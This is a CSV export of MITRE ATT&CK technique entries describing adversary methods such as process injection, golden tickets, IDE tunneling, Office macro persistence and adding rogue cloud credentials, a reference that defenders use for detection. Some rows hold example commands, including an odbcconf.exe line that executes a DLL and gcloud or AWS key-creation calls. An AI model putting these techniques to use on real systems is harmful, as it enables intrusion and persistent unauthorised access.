attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef,1,T1092,Communication Through Removable Media,"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:09Z
attack-pattern--66b34be7-6915-4b83-8d5a-b0f0592b5e41,1,T1176.002,IDE Extensions,"Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.(Citation: Mnemonic misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)) or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation: Lakshmanan Visual Studio Marketplace)   

In addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).  

Trust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions  2025)","Linux, macOS, Windows",FALSE,FALSE,2025-03-30T22:16:24Z
attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b,1,T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control privilege elevation to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),"Linux, macOS, Windows, IaaS, Office Suite, Identity Provider",FALSE,FALSE,2020-01-30T13:58:14Z
attack-pattern--6bc7f9aa-b91f-4b23-84b8-5e756eba68eb,1,T1673,Virtual Machine Discovery,"An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) such as `esxcli` or `vim-cmd` (e.g. `esxcli vm process list or vim-cmd vmsvc/getallvms`).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: TrendMicro Play) Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. 

Adversaries may use the information from [Virtual Machine Discovery](https://attack.mitre.org/techniques/T1673) during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as [Service Stop](https://attack.mitre.org/techniques/T1489) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2025-03-27T15:32:17Z
attack-pattern--6c2957f9-502a-478c-b1dd-d626c0659413,1,T1590.006,Network Security Appliances,"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T16:01:35Z
attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071,1,T1218.008,Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) 
",Windows,FALSE,FALSE,2020-01-24T15:01:32Z
attack-pattern--6e561441-8431-4773-a9b8-ccf28ef6a968,1,T1593.002,Search Engines,"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,FALSE,FALSE,2020-10-02T16:50:12Z
attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197,1,T1055.013,Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. 

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
* Load – Create a shared section of memory and load the malicious executable.
* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
* Animate – Create a process from the tainted section of memory and initiate execution.

This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",Windows,FALSE,FALSE,2020-01-14T17:19:50Z
attack-pattern--70d81154-b187-45f9-8ec5-295d01255979,1,T1574.005,Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",Windows,FALSE,FALSE,2020-03-13T11:12:18Z
attack-pattern--73b24a10-6bf4-4af1-a81e-67b8bcb6c4e6,1,T1204.005,Malicious Library,"Adversaries may rely on a user installing a malicious library to facilitate execution. Threat actors may [Upload Malware](https://attack.mitre.org/techniques/T1608/001) to package managers such as NPM and PyPi, as well as to public code repositories such as GitHub. User may install libraries without realizing they are malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that establishes persistence, steals data, or mines cryptocurrency.(Citation: Datadog Security Labs Malicious PyPi Packages 2024)(Citation: Fortinet Malicious NPM Packages 2023)

In some cases, threat actors may compromise and backdoor existing popular libraries (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)). Alternatively, they may create entirely new packages and leverage behaviors such as typosquatting to encourage users to install them.","Linux, macOS, Windows",FALSE,FALSE,2025-05-22T19:50:18Z
attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1,1,T1558.001,Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) 

Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)

The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",Windows,FALSE,FALSE,2020-02-11T19:13:33Z
attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c,1,T1592.004,Client Configurations,"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T16:47:16Z
attack-pattern--77e29a47-e263-4f11-8692-e5012f44dbac,1,T1219.001,IDE Tunneling,"Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.(Citation: sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06 September 2024)(Citation: Thornton tutorial VSCode shell September 2023)

Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.

IDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).","Linux, macOS, Windows",FALSE,FALSE,2025-03-20T18:46:24Z
attack-pattern--791481f8-e96a-41be-b089-a088763083d4,1,T1542.002,Component Firmware,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.

Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.","Windows, Linux, macOS",FALSE,FALSE,2019-12-19T20:21:21Z
attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21,1,T1137.001,Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)

Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) 

Word Normal.dotm location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

Excel Personal.xlsb location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) 

An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.","Office Suite, Windows",FALSE,FALSE,2019-11-07T20:29:17Z
attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc,1,T1213.001,Confluence,"
Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
",SaaS,FALSE,FALSE,2020-02-14T13:09:51Z
attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1,1,T1609,Container Administration Command,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)

In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)",Containers,FALSE,FALSE,2021-03-29T16:39:26Z
attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605,1,T1055.004,Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. 

APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). 

A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",Windows,FALSE,FALSE,2020-01-14T01:29:43Z
attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331,1,T1649,Steal or Forge Authentication Certificates,"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)

Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)

Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.

Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)","Windows, Linux, macOS, Identity Provider",FALSE,FALSE,2022-08-03T03:20:58Z
attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215,1,T1098.005,Device Registration,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.

MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)

Similarly, an adversary with existing access to a network may register a device or a virtual machine to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537)(Citation: Expel Atlas Lion 2025)

Devices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)","Windows, Identity Provider",FALSE,FALSE,2022-03-04T18:30:38Z
attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1,1,T1568.003,DNS Calculation,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)

One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-11T14:56:34Z
attack-pattern--84771bc3-f6a0-403e-b144-01af70e5fda0,1,T1608,Stage Capabilities,"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)

Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):

* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)
* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)
* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)
* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",PRE,FALSE,FALSE,2021-03-17T20:04:09Z
attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd,1,T1098.001,Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)

In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)

Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) 

In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.
(Citation: Crowdstrike AWS User Federation Persistence)

In Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset.(Citation: Microsoft Entra ID App Passwords)","IaaS, Identity Provider, SaaS",FALSE,FALSE,2020-01-19T16:10:15Z
attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5,1,T1585.003,Cloud Accounts,"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider.",PRE,FALSE,FALSE,2022-05-27T14:06:05Z
attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3,1,T1552.008,Chat Messages,"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.

Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).","SaaS, Office Suite",FALSE,FALSE,2023-03-14T14:38:03Z
attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c,1,T1546.001,Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code>. For example: 

* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
